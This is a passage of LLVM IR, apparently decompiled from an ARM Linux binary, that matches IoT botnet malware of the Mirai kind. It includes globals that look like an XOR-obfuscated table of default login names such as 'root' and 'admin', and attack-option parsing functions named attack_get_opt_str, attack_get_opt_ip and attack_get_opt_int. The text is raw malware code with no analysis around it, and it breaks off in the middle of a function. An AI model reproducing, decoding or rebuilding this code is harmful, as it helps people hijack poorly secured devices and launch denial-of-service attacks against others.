source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_20d10.22 = global i32 0
@global_var_c350.26 = constant i32 -382906384
@global_var_ff00.28 = constant i32 69324
@global_var_11adc.29 = constant i32 -382909968
@global_var_20f34.33 = global i32 0
@global_var_b468.39 = constant i32 -382906384
@global_var_b8d4.41 = constant i32 -382906384
@global_var_abdc.43 = constant i32 -382906384
@global_var_a504.45 = constant i32 -382906384
@global_var_9de0.47 = constant i32 -382906384
@global_var_95b4.49 = constant i32 -382906384
@global_var_8f54.51 = constant i32 -382906384
@global_var_888c.53 = constant i32 -382906384
@global_var_23a4c.55 = global i32 0
@global_var_a500.58 = constant i32 145996
@global_var_c0c4.66 = constant i32 -382910448
@global_var_20dc4.68 = global i32 64068
@global_var_23a54.72 = local_unnamed_addr global i32 0
@global_var_23a52.73 = local_unnamed_addr global i32 0
@global_var_20dbc.75 = global i32 -1
@global_var_20f38.80 = global i32 0
@global_var_18114.87 = constant i32 10
@global_var_20dc0.89 = global i32 -1
@global_var_12da0.94 = constant i32 -450904024
@global_var_fa44.95 = constant i32 -382910352
@global_var_18118.99 = constant i32 16777216
@global_var_20f40.101 = global i32 0
@global_var_20f4c.103 = global i32 0
@global_var_20f44.105 = global i32 0
@global_var_20f48.107 = global i32 0
@global_var_23a68.117 = global i32 0
@global_var_20f84.119 = global i32 0
@global_var_20f50.121 = global i32 0
@global_var_20f7c.123 = global i32 0
@global_var_cf44.126 = constant i32 146024
@global_var_d1f4.128 = constant i32 135044
@global_var_23a60.130 = global i32 0
@global_var_23a64.132 = global i32 0
@global_var_20f56.135 = local_unnamed_addr global i32 0
@global_var_20f68.137 = global i32 0
@global_var_20f5c.139 = local_unnamed_addr global i32 0
@global_var_20f58.140 = local_unnamed_addr global i32 0
@global_var_20f5d.141 = local_unnamed_addr global i32 0
@global_var_20f76.144 = local_unnamed_addr global i32 0
@global_var_185f0.146 = constant i32 0
@global_var_18494.148 = constant [5 x i8] c"PMMV\00"
@global_var_18638.150 = constant [6 x i8] c"CFOKL\00"
@global_var_18120.152 = constant i32 387006810
@global_var_18128.154 = constant [6 x i8] c"TKXZT\00"
@global_var_18130.156 = constant i32 437918234
@global_var_18138.158 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_18140.160 = constant [8 x i8] c"FGDCWNV\00"
@global_var_18148.162 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_18154.164 = constant i32 370216979
@global_var_1815c.166 = constant i32 269555223
@global_var_18164.168 = constant [8 x i8] c"QWRRMPV\00"
@global_var_18570.170 = constant i32 370216979
@global_var_1816c.172 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_18178.174 = constant i32 370216979
@global_var_18180.176 = constant [5 x i8] c"WQGP\00"
@global_var_18188.178 = constant [5 x i8] c"RCQQ\00"
@global_var_18190.180 = constant i32 1263486531
@global_var_182e4.182 = constant i32 320017171
@global_var_1819c.184 = constant [9 x i8] c"QOACFOKL\00"
@global_var_181a8.186 = constant i32 336860180
@global_var_181b0.188 = constant i32 324292169
@global_var_181b8.190 = constant [14 x i8] c"cFOKLKQVPCVMP\00"
@global_var_181c8.192 = constant [7 x i8] c"OGKLQO\00"
@global_var_181d0.194 = constant [4 x i8] c"@WJ\00"
@global_var_181d4.196 = constant [7 x i8] c"RW@NKA\00"
@global_var_181dc.198 = constant [8 x i8] c"QGPTKAG\00"
@global_var_181e4.200 = constant [11 x i8] c"QWRGPTKQMP\00"
@global_var_181f0.202 = constant [6 x i8] c"EWGQV\00"
@global_var_181f8.204 = constant i32 1263486531
@global_var_18200.206 = constant [14 x i8] c"CFOKLKQVPCVMP\00"
@global_var_18210.208 = constant [5 x i8] c"W@LV\00"
@global_var_18218.210 = constant i32 324292169
@global_var_18220.212 = constant i32 390551160
@global_var_18228.214 = constant i32 387009354
@global_var_cfa0.215 = constant i32 98864
@global_var_18230.216 = constant [6 x i8] c"HT@XF\00"
@global_var_18238.218 = constant [5 x i8] c"CLIM\00"
@global_var_18240.220 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_18248.222 = constant [9 x i8] c"AJCLEGOG\00"
@global_var_18254.224 = constant i32 1867011861
@global_var_18264.226 = constant i32 1867011861
@global_var_18274.228 = constant [7 x i8] c"Q[QVGO\00"
@global_var_1827c.230 = constant [5 x i8] c"KIU@\00"
@global_var_18284.232 = constant [9 x i8] c"FPGCO@MZ\00"
@global_var_18290.234 = constant [8 x i8] c"PGCNVGI\00"
@global_var_18298.236 = constant i32 303174162
@global_var_182a4.238 = constant i32 303174162
@global_var_182ac.240 = constant i32 320017171
@global_var_182b4.242 = constant i32 1263486531
@global_var_1814c.244 = constant [5 x i8] c"VGAJ\00"
@global_var_182c0.246 = constant i32 454761243
@global_var_182cc.248 = constant [6 x i8] c"oGKLQ\00"
@global_var_182d4.250 = constant [4 x i8] c"hta\00"
@global_var_182d8.252 = constant i32 319820054
@global_var_182e0.254 = constant i32 320017171
@global_var_182ec.256 = constant [7 x i8] c"WVQVCP\00"
@global_var_182f4.258 = constant [9 x i8] c"XMMOCFQN\00"
@global_var_18300.260 = constant i32 1263486531
@global_var_18308.262 = constant i32 303059531
@global_var_18310.264 = constant i32 303125067
@global_var_18318.266 = constant i32 303452747
@global_var_18320.268 = constant [7 x i8] c"@KLVGA\00"
@global_var_d014.269 = constant i32 99112
@global_var_18328.270 = constant [8 x i8] c"VQWLCOK\00"
@global_var_18330.272 = constant i32 323043395
@global_var_18338.274 = constant i32 319951888
@global_var_18340.276 = constant [7 x i8] c"Q[LLGV\00"
@global_var_18348.278 = constant [9 x i8] c"@C[CLFQN\00"
@global_var_18354.280 = constant [6 x i8] c"SWQGP\00"
@global_var_1844c.282 = constant i32 1118227
@global_var_1835c.284 = constant i32 370216979
@global_var_18364.286 = constant [8 x i8] c"oCLCEGP\00"
@global_var_1836c.288 = constant [4 x i8] c"CFO\00"
@global_var_18370.290 = constant [8 x i8] c"OCLCEGP\00"
@global_var_18378.292 = constant [7 x i8] c"DPKGLF\00"
@global_var_18380.294 = constant [4 x i8] c"CRA\00"
@global_var_18384.296 = constant i32 1263421261
@global_var_18390.298 = constant [5 x i8] c"VKLK\00"
@global_var_18398.300 = constant [7 x i8] c"CQAGLF\00"
@global_var_183a0.302 = constant i32 1265504102
@global_var_183a8.304 = constant [6 x i8] c"FNKLI\00"
@global_var_183b0.306 = constant [6 x i8] c"NMEKL\00"
@global_var_183b8.308 = constant i32 1296912387
@global_var_183c0.310 = constant [9 x i8] c"AC@NGAMO\00"
@global_var_183cc.312 = constant [7 x i8] c"PMWVGP\00"
@global_var_183d4.314 = constant [8 x i8] c"LGVMRKC\00"
@global_var_183dc.316 = constant [7 x i8] c"Q[QCFO\00"
@global_var_183e4.318 = constant [8 x i8] c"CLKAWQV\00"
@global_var_183ec.320 = constant [6 x i8] c"FG@WE\00"
@global_var_183f4.322 = constant [10 x i8] c"F\0CG\0C@\0CW\0CE\00"
@global_var_18400.324 = constant [5 x i8] c"GAJM\00"
@global_var_18408.326 = constant [5 x i8] c"FKCE\00"
@global_var_18410.328 = constant [7 x i8] c"QUKVAJ\00"
@global_var_183e0.330 = constant [3 x i8] c"FO\00"
@global_var_18418.332 = constant [7 x i8] c"VGNLGV\00"
@global_var_18420.334 = constant i32 370216979
@global_var_1842c.336 = constant [5 x i8] c"VMMP\00"
@global_var_18434.338 = constant [7 x i8] c"ACNTKL\00"
@global_var_1843c.340 = constant i32 370216979
@global_var_18448.342 = constant i32 1447906640
@global_var_18450.344 = constant i32 1447512643
@global_var_1845c.346 = constant i32 454302484
@global_var_18464.348 = constant i32 387400530
@global_var_18470.350 = constant i32 319885331
@global_var_18478.352 = constant i32 1986882928
@global_var_18480.354 = constant [7 x i8] c"CNRKLG\00"
@global_var_18488.356 = constant i32 457659992
@global_var_18490.358 = constant i32 303043392
@global_var_1849c.360 = constant [9 x i8] c"rcqqumpf\00"
@global_var_184a8.362 = constant [6 x i8] c"cfokl\00"
@global_var_184b0.364 = constant [8 x i8] c"LGVEGCP\00"
@global_var_184b8.366 = constant i32 303257172
@global_var_184c0.368 = constant [4 x i8] c"K@O\00"
@global_var_184c4.370 = constant [7 x i8] c"T[CVVC\00"
@global_var_184cc.372 = constant [6 x i8] c"cFOKL\00"
@global_var_184d4.374 = constant i32 373380675
@global_var_184dc.376 = constant [7 x i8] c"OKAPMQ\00"
@global_var_184e4.378 = constant [6 x i8] c"QGVWR\00"
@global_var_184ec.380 = constant [8 x i8] c"AMOACQV\00"
@global_var_184f4.382 = constant [4 x i8] c"RMQ\00"
@global_var_184f8.384 = constant [4 x i8] c"UUU\00"
@global_var_184fc.386 = constant i32 303176208
@global_var_18504.388 = constant [5 x i8] c"w`lv\00"
@global_var_1850c.390 = constant [7 x i8] c"LGVOCL\00"
@global_var_18514.392 = constant [6 x i8] c"Cfokl\00"
@global_var_1851c.394 = constant [7 x i8] c"FCGOML\00"
@global_var_18524.396 = constant [5 x i8] c"FGOM\00"
@global_var_1852c.398 = constant [6 x i8] c"CPPKQ\00"
@global_var_18534.400 = constant [8 x i8] c"nKLIQ[Q\00"
@global_var_1853c.402 = constant [7 x i8] c"ANKGLV\00"
@global_var_18544.404 = constant [6 x i8] c"AKQAM\00"
@global_var_1854c.406 = constant [6 x i8] c"akqam\00"
@global_var_18554.408 = constant [6 x i8] c"QWRGP\00"
@global_var_1855c.410 = constant [5 x i8] c"QWPV\00"
@global_var_d14c.411 = constant i32 99684
@global_var_18564.412 = constant i32 370611221
@global_var_182f8.414 = constant [5 x i8] c"CFQN\00"
@global_var_1856c.416 = constant i32 1313949251
@global_var_18578.418 = constant [7 x i8] c"RCVPMN\00"
@global_var_18580.420 = constant i32 387007823
@global_var_18588.422 = constant [7 x i8] c"OGPNKL\00"
@global_var_18590.424 = constant [9 x i8] c"LGVCFOKL\00"
@global_var_1859c.426 = constant [9 x i8] c"JGUNRCAI\00"
@global_var_185a8.428 = constant [7 x i8] c"lGVkaQ\00"
@global_var_185b0.430 = constant i32 1179729984
@global_var_185bc.432 = constant [5 x i8] c"lwnn\00"
@global_var_185c4.434 = constant [9 x i8] c"CFOKLVVF\00"
@global_var_185d0.436 = constant [9 x i8] c"MRGPCVMP\00"
@global_var_185dc.438 = constant [9 x i8] c"rNAOqRkR\00"
@global_var_185e8.440 = constant i32 269488144
@global_var_185f4.442 = constant [9 x i8] c"QGAWPKV[\00"
@global_var_18600.444 = constant [9 x i8] c"OMWLVQ[Q\00"
@global_var_1860c.446 = constant [8 x i8] c"OGOMVGA\00"
@global_var_18614.448 = constant i32 1464562030
@global_var_18624.450 = constant i32 2003334929
@global_var_18634.452 = constant [10 x i8] c"OWQGCFOKL\00"
@global_var_18640.454 = constant i32 1196513135
@global_var_1864c.456 = constant [10 x i8] c"QVMPUCVAJ\00"
@global_var_18658.458 = constant [11 x i8] c"QRGAKCNKQV\00"
@global_var_18664.460 = constant [10 x i8] c"CFOKLRNFV\00"
@global_var_18670.462 = constant [10 x i8] c"RNFVCFOKL\00"
@global_var_1867c.464 = constant i32 1279478337
@global_var_18688.466 = constant [13 x i8] c"VGNGAMOCFOKL\00"
@global_var_18698.468 = constant [13 x i8] c"CFOKLVGNGAMO\00"
@global_var_186a8.470 = constant [7 x i8] c"EWGQV\22\00"
@global_var_186b0.472 = constant i32 336675162
@global_var_186b8.474 = constant [9 x i8] c"FGDCWNV\22\00"
@global_var_186c4.476 = constant [8 x i8] c"CLVQNS\22\00"
@global_var_186cc.478 = constant [12 x i8] c"QWRGPTKQMP\22\00"
@global_var_186d8.480 = constant i32 1178819416
@global_var_186e4.482 = constant [6 x i8] c"PMMV\22\00"
@global_var_20f60.483 = local_unnamed_addr global i32 0
@global_var_20f5e.484 = local_unnamed_addr global i32 0
@global_var_20f64.485 = local_unnamed_addr global i32 0
@global_var_20f6c.487 = local_unnamed_addr global i32 0
@global_var_20f78.488 = local_unnamed_addr global i32 0
@global_var_ccd4.496 = constant i32 -382910352
@global_var_186ec.498 = constant [3 x i8] c"\0D\0A\00"
@global_var_186f8.500 = constant i32 2096127
@global_var_186ef.502 = constant i32 2095871
@global_var_23a70.509 = global i32 0
@global_var_20dcc.512 = global i32 1043935
@global_var_186fc.517 = constant i32 39228
@global_var_23a78.518 = local_unnamed_addr global i32 0
@global_var_23a7c.519 = local_unnamed_addr global i32 0
@global_var_18700.521 = constant i32 55430
@global_var_23a80.522 = local_unnamed_addr global i32 0
@global_var_23a84.523 = local_unnamed_addr global i32 0
@global_var_18704.525 = constant [20 x i8] c"jT^VXYsTZZXOnQ\5CDXO=\00"
@global_var_23a88.526 = local_unnamed_addr global i32 0
@global_var_23a8c.527 = local_unnamed_addr global i32 0
@global_var_18718.529 = constant [7 x i8] c"NUXQQ=\00"
@global_var_23b20.530 = local_unnamed_addr global i32 0
@global_var_23b24.531 = local_unnamed_addr global i32 0
@global_var_18720.533 = constant [8 x i8] c"XS\5C_QX=\00"
@global_var_23b28.534 = local_unnamed_addr global i32 0
@global_var_23b2c.535 = local_unnamed_addr global i32 0
@global_var_18728.537 = constant [8 x i8] c"NDNIXP=\00"
@global_var_23b30.538 = local_unnamed_addr global i32 0
@global_var_23b34.539 = local_unnamed_addr global i32 0
@global_var_18730.541 = constant [4 x i8] c"NU=\00"
@global_var_23b38.542 = local_unnamed_addr global i32 0
@global_var_23b3c.543 = local_unnamed_addr global i32 0
@global_var_18734.545 = constant i32 1398038290
@global_var_23b44.546 = local_unnamed_addr global i32 0
@global_var_23b40.547 = local_unnamed_addr global i32 0
@global_var_18750.549 = constant i32 1449022538
@global_var_23b48.550 = local_unnamed_addr global i32 0
@global_var_23b4c.551 = local_unnamed_addr global i32 0
@global_var_18770.553 = constant [10 x i8] c"S^ROOX^I=\00"
@global_var_23b54.554 = local_unnamed_addr global i32 0
@global_var_23b50.555 = local_unnamed_addr global i32 0
@global_var_1877c.557 = constant [9 x i8] c"\5CNNJROY=\00"
@global_var_23b58.558 = local_unnamed_addr global i32 0
@global_var_23b5c.559 = local_unnamed_addr global i32 0
@global_var_18788.561 = constant [6 x i8] c"RZTS=\00"
@global_var_23b64.562 = local_unnamed_addr global i32 0
@global_var_23b60.563 = local_unnamed_addr global i32 0
@global_var_18790.565 = constant [7 x i8] c"XSIXO=\00"
@global_var_23b68.566 = local_unnamed_addr global i32 0
@global_var_23b6c.567 = local_unnamed_addr global i32 0
@global_var_18798.569 = constant i32 1213361769
@global_var_23b70.570 = local_unnamed_addr global i32 0
@global_var_187b0.572 = constant i32 1581864978
@global_var_23b78.573 = local_unnamed_addr global i32 0
@global_var_187c4.575 = constant [12 x i8] c"S\5CPXNXOKXO=\00"
@global_var_23b80.576 = local_unnamed_addr global i32 0
@global_var_187d0.578 = constant i32 1264081170
@global_var_23b88.579 = local_unnamed_addr global i32 0
@global_var_187e8.581 = constant i32 1264081170
@global_var_23b90.582 = local_unnamed_addr global i32 0
@global_var_187fc.584 = constant i32 1208552964
@global_var_23b98.585 = local_unnamed_addr global i32 0
@global_var_18814.587 = constant [12 x i8] c"YKOnI\5COIHM=\00"
@global_var_23ba0.588 = local_unnamed_addr global i32 0
@global_var_20d14.594 = global i32 0
@global_var_10594.629 = constant i32 67560
@global_var_107e8.630 = constant i32 294
@global_var_10720.635 = constant i32 -382908432
@global_var_10664.640 = constant i32 -442515360
@global_var_10a9c.655 = constant i32 -478871519
@global_var_102b8.657 = constant [3 x i8] c"@\0B\00"
@global_var_11540.673 = constant i32 -478805983
@global_var_11928.683 = constant i32 -382906384
@global_var_13820.692 = constant i32 -442544040
@global_var_120ac.711 = constant i32 -369098502
@global_var_e8dc.713 = constant i32 -481099741
@global_var_12a80.726 = constant i32 -382910288
@global_var_12c30.738 = constant i32 -2020859901
@global_var_12d1c.741 = constant i32 -494075872
@global_var_10094.742 = constant i32 -382910336
@global_var_23f30.745 = local_unnamed_addr global i32 0
@global_var_11d58.758 = constant i32 -442543860
@global_var_101b0.766 = constant i32 -369093262
@global_var_13be0.809 = constant i32 -443088884
@global_var_15200.827 = constant i32 -382906384
@global_var_c54c.839 = constant i32 -509607927
@global_var_14cc0.857 = constant i32 -382910448
@global_var_16934.858 = constant i32 -382909968
@global_var_b744.874 = constant i32 167772233
@global_var_15c8c.876 = constant i32 -456978431
@global_var_a780.911 = constant i32 -443744248
@global_var_166e8.912 = constant i32 -382910352
@global_var_17070.925 = constant i32 -481296376
@global_var_17168.926 = constant i32 -481296376
@global_var_171ec.927 = constant i32 -369098732
@global_var_20f14.12 = external global i8*
@global_var_20f30.31 = external global i8*
@global_var_20f31.37 = global i8 0
@global_var_23a50.70 = global i16* null
@1 = internal constant [2 x i8] c"\01\00"
@global_var_20dc8.77 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_20f3c.92 = external global i8*
@global_var_20f80.125 = global i16* null
@global_var_20f54.134 = external global i8*
@global_var_20f74.138 = local_unnamed_addr global i8 0
@global_var_20f6a.142 = local_unnamed_addr global i16 0
@global_var_20f75.143 = local_unnamed_addr global i8 0
@global_var_20d6c.590 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_20f14.12 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_20f14.12 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_20f14.12, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_20d10.22, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_20d10.22 to i32)

; uselistorder directives
  uselistorder i32* @global_var_20d10.22, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_c350.26 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 98564, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_822c = icmp eq i32 %arg1, 0
  %v3_8230 = load i32, i32* @r4, align 4
  store i32 %v3_8230, i32* %stack_var_-8, align 4
  %v6_8230 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_822c, label %dec_label_pc_8274, label %dec_label_pc_823c

dec_label_pc_823c:                                ; preds = %entry
  %v0_823c = load i32, i32* %r1.global-to-local, align 4
  %v1_823c = add i32 %v0_823c, 4
  %v2_823c = inttoptr i32 %v1_823c to i8*
  %v3_823c = load i8, i8* %v2_823c, align 1
  %v4_823c = zext i8 %v3_823c to i32
  %v9_8240 = icmp eq i32 %v4_823c, %arg3
  br i1 %v9_8240, label %dec_label_pc_8280, label %dec_label_pc_8264.preheader

dec_label_pc_8264.preheader:                      ; preds = %dec_label_pc_823c
  br label %dec_label_pc_8264

dec_label_pc_8254:                                ; preds = %dec_label_pc_8264
  %v1_8254 = add i32 %v0_825c.in, 12
  %v2_8254 = inttoptr i32 %v1_8254 to i8*
  %v3_8254 = load i8, i8* %v2_8254, align 1
  %v4_8254 = zext i8 %v3_8254 to i32
  %v9_8258 = icmp eq i32 %v4_8254, %arg3
  br i1 %v9_8258, label %dec_label_pc_8280, label %dec_label_pc_8264

dec_label_pc_8264:                                ; preds = %dec_label_pc_8264.preheader, %dec_label_pc_8254
  %v0_825c.in = phi i32 [ %v0_823c, %dec_label_pc_8264.preheader ], [ %v0_825c, %dec_label_pc_8254 ]
  %v0_8264 = phi i32 [ 0, %dec_label_pc_8264.preheader ], [ %v1_8264, %dec_label_pc_8254 ]
  %v0_825c = add i32 %v0_825c.in, 8
  %v1_8264 = add i32 %v0_8264, 1
  %v9_8268 = icmp eq i32 %v1_8264, %arg1
  store i32 %v0_825c, i32* %r1.global-to-local, align 4
  br i1 %v9_8268, label %dec_label_pc_8274, label %dec_label_pc_8254

dec_label_pc_8274:                                ; preds = %dec_label_pc_8264, %dec_label_pc_8280, %entry, %dec_label_pc_828c
  %v2_8278 = phi i32 [ %v3_8230, %dec_label_pc_8280 ], [ %v3_8230, %entry ], [ %v2_8278.pre, %dec_label_pc_828c ], [ %v3_8230, %dec_label_pc_8264 ]
  %v0_8274 = phi i32 [ %arg4, %dec_label_pc_8280 ], [ %arg4, %entry ], [ %v1_828c, %dec_label_pc_828c ], [ %arg4, %dec_label_pc_8264 ]
  store i32 %v2_8278, i32* @r4, align 4
  store i32 %v6_8230, i32* @lr, align 4
  ret i32 %v0_8274

dec_label_pc_8280:                                ; preds = %dec_label_pc_8254, %dec_label_pc_823c
  %v0_8280 = phi i32 [ %v0_823c, %dec_label_pc_823c ], [ %v0_825c, %dec_label_pc_8254 ]
  %v1_8280 = inttoptr i32 %v0_8280 to i32*
  %v2_8280 = load i32, i32* %v1_8280, align 4
  store i32 %v2_8280, i32* @r0, align 4
  %v2_8284 = icmp eq i32 %v2_8280, 0
  br i1 %v2_8284, label %dec_label_pc_8274, label %dec_label_pc_828c

dec_label_pc_828c:                                ; preds = %dec_label_pc_8280
  %v1_828c = call i32 @inet_addr(i32 %v2_8280)
  %v2_8278.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8274

; uselistorder directives
  uselistorder i32 %v1_8264, { 1, 0 }
  uselistorder i32 %v0_825c, { 1, 0, 2 }
  uselistorder i32 %v0_825c.in, { 1, 0 }
  uselistorder i32 %v0_823c, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8274, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8264, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8298 = icmp eq i32 %arg1, 0
  %v3_829c = load i32, i32* @r4, align 4
  store i32 %v3_829c, i32* %stack_var_-8, align 4
  %v6_829c = load i32, i32* @lr, align 4
  br i1 %v2_8298, label %dec_label_pc_82e0, label %dec_label_pc_82a8

dec_label_pc_82a8:                                ; preds = %entry
  %v0_82a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_82a8 = add i32 %v0_82a8, 4
  %v2_82a8 = inttoptr i32 %v1_82a8 to i8*
  %v3_82a8 = load i8, i8* %v2_82a8, align 1
  %v4_82a8 = zext i8 %v3_82a8 to i32
  %v9_82ac = icmp eq i32 %v4_82a8, %arg3
  br i1 %v9_82ac, label %dec_label_pc_82ec, label %dec_label_pc_82d0.preheader

dec_label_pc_82d0.preheader:                      ; preds = %dec_label_pc_82a8
  br label %dec_label_pc_82d0

dec_label_pc_82c0:                                ; preds = %dec_label_pc_82d0
  %v1_82c0 = add i32 %v0_82c8.in, 12
  %v2_82c0 = inttoptr i32 %v1_82c0 to i8*
  %v3_82c0 = load i8, i8* %v2_82c0, align 1
  %v4_82c0 = zext i8 %v3_82c0 to i32
  %v9_82c4 = icmp eq i32 %v4_82c0, %arg3
  br i1 %v9_82c4, label %dec_label_pc_82ec, label %dec_label_pc_82d0

dec_label_pc_82d0:                                ; preds = %dec_label_pc_82d0.preheader, %dec_label_pc_82c0
  %v0_82c8.in = phi i32 [ %v0_82a8, %dec_label_pc_82d0.preheader ], [ %v0_82c8, %dec_label_pc_82c0 ]
